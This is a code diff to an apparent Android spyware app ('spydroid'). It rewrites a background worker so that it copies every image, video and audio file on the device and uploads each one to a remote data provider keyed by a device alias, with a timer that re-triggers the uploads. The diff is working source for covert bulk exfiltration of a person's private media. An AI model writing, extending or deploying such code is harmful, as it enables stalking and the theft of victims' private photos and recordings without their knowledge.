@@ -19,9 +19,11 @@ package net.spydroid.feature.multimedia
 
 import android.content.ContentUris
 import android.content.Context
+import android.net.Uri
 import android.provider.MediaStore
 import android.provider.MediaStore.Video
 import android.util.Log
+import android.widget.Toast
 import androidx.core.net.toUri
 import androidx.work.Worker
 import androidx.work.WorkerParameters
@@ -41,6 +43,7 @@ import kotlinx.coroutines.flow.stateIn
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import net.spydroid.common.local.LocalDataProvider
+import net.spydroid.common.remote.RemoteDataProvider
 import net.spydroid.feature.multimedia.local.domain.AudioRepository
 import net.spydroid.feature.multimedia.local.domain.ImageRepository
 import net.spydroid.feature.multimedia.local.domain.VideoRepository
@@ -50,6 +53,9 @@ import net.spydroid.feature.multimedia.local.models.VideoHandler
 import net.spydroid.feature.multimedia.local.states.AudioState
 import net.spydroid.feature.multimedia.local.states.ImageState
 import net.spydroid.feature.multimedia.local.states.VideoState
+import java.io.File
+import java.io.FileOutputStream
+import java.io.InputStream
 
 
 @EntryPoint
@@ -72,6 +78,32 @@ private interface AudioWorkEntryPoint {
 }
 
 
+private fun getFileFromUri(context: Context, uri: Uri, ext: String): File {
+
+    val tempFile = when (ext) {
+        "jpg" -> "image"
+        "mp4" -> "video"
+        "mp3" -> "audio"
+        else -> "unknown"
+    }
+    val inputStream: InputStream? = context.contentResolver.openInputStream(uri)
+    val file = File(context.cacheDir, "${tempFile}_${System.currentTimeMillis()}.$ext")
+
+    val outputStream = FileOutputStream(file)
+    val buffer = ByteArray(1024)
+    var length: Int
+
+    while (inputStream?.read(buffer).also { length = it!! } != -1) {
+        outputStream.write(buffer, 0, length)
+    }
+
+    outputStream.flush()
+    outputStream.close()
+    inputStream?.close()
+
+    return file
+}
+
 class MultimediaWork(
     private val context: Context,
     workerParams: WorkerParameters
@@ -79,9 +111,12 @@ class MultimediaWork(
     Worker(context, workerParams) {
 
     private val localDataProvider = LocalDataProvider.current(context)
+    private val remoteDataProvider = RemoteDataProvider.current(context)
+
     private val scope = CoroutineScope(Dispatchers.IO)
 
-    private val imageRepository =
+    /*
+        private val imageRepository =
         EntryPointAccessors.fromApplication(context, ImagesWorkEntryPoint::class.java)
             .imageRepository()
     private val videoRepository =
@@ -90,42 +125,16 @@ class MultimediaWork(
     private val audioRepository =
         EntryPointAccessors.fromApplication(context, AudioWorkEntryPoint::class.java)
             .audioRepository()
+     */
 
     override fun doWork(): Result {
         try {
-            val imageState: StateFlow<ImageState> = imageRepository
-                .image.map<List<ImageHandler>, ImageState> { ImageState.Success(data = it) }
-                .catch { emit(ImageState.Error(it)) }
-                .stateIn(
-                    scope, SharingStarted.WhileSubscribed(5000),
-                    ImageState.Loading
-                )
-
-            val videoState: StateFlow<VideoState> = videoRepository
-                .video.map<List<VideoHandler>, VideoState> { VideoState.Success(data = it) }
-                .catch { emit(VideoState.Error(it)) }
-                .stateIn(
-                    scope, SharingStarted.WhileSubscribed(5000),
-                    VideoState.Loading
-                )
-
-            val audioState: StateFlow<AudioState> = audioRepository
-                .audio.map<List<AudioHandler>, AudioState> { AudioState.Success(data = it) }
-                .catch { emit(AudioState.Error(it)) }
-                .stateIn(
-                    scope, SharingStarted.WhileSubscribed(5000),
-                    AudioState.Loading
-                )
-
             scope.launch {
-                imageState.collect { state ->
-                    when (state) {
-                        is ImageState.Loading -> {}
-                        is ImageState.Error -> {}
-                        is ImageState.Success -> {
-                            val data = state.data
-                            val existing = data.map { it.image }.toSet()
-                            scope.launch {
+
+                localDataProvider.aliasDevice.collect { alias ->
+                    if (alias.isNotBlank()) {
+                        remoteDataProvider.unuploadedFilesToInternet.collect { FilesToInternet ->
+                            if (!FilesToInternet) {
                                 withContext(Dispatchers.IO) {
                                     val projectionImage = arrayOf(MediaStore.Images.Media._ID)
                                     val cursorImage = context.contentResolver.query(
@@ -145,92 +154,79 @@ class MultimediaWork(
                                                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                                 id
                                             )
-                                            if (imageUri.toString() !in existing) {
-                                                imageRepository.insert(
-                                                    ImageHandler(
-                                                        image = imageUri.toString()
-                                                    )
+                                            withContext(Dispatchers.IO) {
+                                                remoteDataProvider.setFile(
+                                                    file = getFileFromUri(context, imageUri, "jpg"),
+                                                    type = "IMAGE",
+                                                    alias = alias
                                                 )
                                             }
                                         }
                                     }
-
                                 }
-                            }
 
-                            scope.launch(Dispatchers.IO) {
-                                if (data.isNotEmpty()) {
-                                    delay(5000) // 5 seconds Wait
-                                    data.forEach { uri ->
-                                        localDataProvider.setMultimediaCurrent(image = uri.image.toUri()) // add image to list in LocalDataProvider
-                                    }
-                                }
+                            } else {
+                                // UPDATE IMAGES
+                                showText("ACTUALIZANDO IMAGENES")
                             }
                         }
+
                     }
                 }
+
             }
 
+
             scope.launch {
-                videoState.collect { state ->
-                    when (state) {
-                        is VideoState.Loading -> {}
-                        is VideoState.Error -> {}
-                        is VideoState.Success -> {
-                            val data = state.data
-                            val existing = data.map { it.video }.toSet()
-                            scope.launch {
+                localDataProvider.aliasDevice.collect { alias ->
+                    if (alias.isNotBlank()) {
+                        remoteDataProvider.unuploadedFilesToInternet.collect { FilesToInternet ->
+                            if (!FilesToInternet) {
                                 withContext(Dispatchers.IO) {
-                                    val projectionVideo = arrayOf(MediaStore.Video.Media._ID)
+                                    val projectionVideo = arrayOf(Video.Media._ID)
                                     val cursorVideo = context.contentResolver.query(
                                         MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                                         projectionVideo,
                                         null,
                                         null,
-                                        MediaStore.Video.Media.DATE_ADDED + " DESC"
+                                        Video.Media.DATE_ADDED + " DESC"
                                     )
 
                                     cursorVideo?.use {
                                         val idColumn =
-                                            it.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
+                                            it.getColumnIndexOrThrow(Video.Media._ID)
                                         while (it.moveToNext()) {
                                             val id = it.getLong(idColumn)
                                             val uriVideo = ContentUris.withAppendedId(
-                                                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                                                Video.Media.EXTERNAL_CONTENT_URI,
                                                 id
                                             )
-                                            if (uriVideo.toString() !in existing) {
-                                                videoRepository.insert(
-                                                    VideoHandler(
-                                                        video = uriVideo.toString()
-                                                    )
+                                            withContext(Dispatchers.IO) {
+                                                remoteDataProvider.setFile(
+                                                    file = getFileFromUri(context, uriVideo, "mp4"),
+                                                    type = "VIDEO",
+                                                    alias = alias
                                                 )
                                             }
                                         }
                                     }
                                 }
-                            }
-                            scope.launch(Dispatchers.IO) {
-                                if (data.isNotEmpty()) {
-                                    data.forEach { uri ->
-                                        localDataProvider.setMultimediaCurrent(video = uri.video.toUri())
-                                    }
-                                }
+                            } else {
+                                // UPDATED VIDEOS
+                                showText("ACTUALIZANDO VIDEOS")
                             }
                         }
+
                     }
                 }
+
             }
 
             scope.launch {
-                audioState.collect { state ->
-                    when (state) {
-                        is AudioState.Loading -> {}
-                        is AudioState.Error -> {}
-                        is AudioState.Success -> {
-                            val data = state.data
-                            val existing = data.map { it.audio }.toSet()
-                            scope.launch {
+                localDataProvider.aliasDevice.collect { alias ->
+                    if (alias.isNotBlank()) {
+                        remoteDataProvider.unuploadedFilesToInternet.collect { FilesToInternet ->
+                            if (!FilesToInternet) {
                                 withContext(Dispatchers.IO) {
                                     val projectionAudio = arrayOf(MediaStore.Audio.Media._ID)
                                     val cursorAudio = context.contentResolver.query(
@@ -250,27 +246,34 @@ class MultimediaWork(
                                                 MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                                                 id
                                             )
-                                            if (uriAudio.toString() !in existing) {
-                                                audioRepository.insert(
-                                                    AudioHandler(
-                                                        audio = uriAudio.toString()
-                                                    )
+                                            withContext(Dispatchers.IO) {
+                                                remoteDataProvider.setFile(
+                                                    file = getFileFromUri(context, uriAudio, "mp3"),
+                                                    type = "AUDIO",
+                                                    alias = alias
                                                 )
                                             }
-
                                         }
                                     }
-
                                 }
-                            }
-                            scope.launch(Dispatchers.IO){
-                                if (data.isNotEmpty()) {
-                                    data.forEach { uri ->
-                                        localDataProvider.setMultimediaCurrent(audio = uri.audio.toUri())
-                                    }
-                                }
+                            } else {
+                                // UPDATED AUDIOS
+                                showText("ACTUALIZANDO AUDIOS")
                             }
                         }
+
+                    }
+                }
+            }
+            scope.launch(Dispatchers.IO) {
+                val mins = 1 // 5 minutes
+                val time = mins * 60 * 1000L
+                remoteDataProvider.unuploadedFilesToInternet.collect {
+                    if (!it) {
+                        Log.d("INICIO_TIM", "ICIANDO TIEMPO")
+                        delay(time)
+                        remoteDataProvider.setStateFilesInternet(true)
+                        Log.d("INICIO_TIM", "TERMINANDO TIEMPO")
                     }
                 }
             }
@@ -279,4 +282,6 @@ class MultimediaWork(
             return Result.failure()
         }
     }
+    private fun showText(text: String) =
+        Log.d("INICIO_TIM", text)
 }
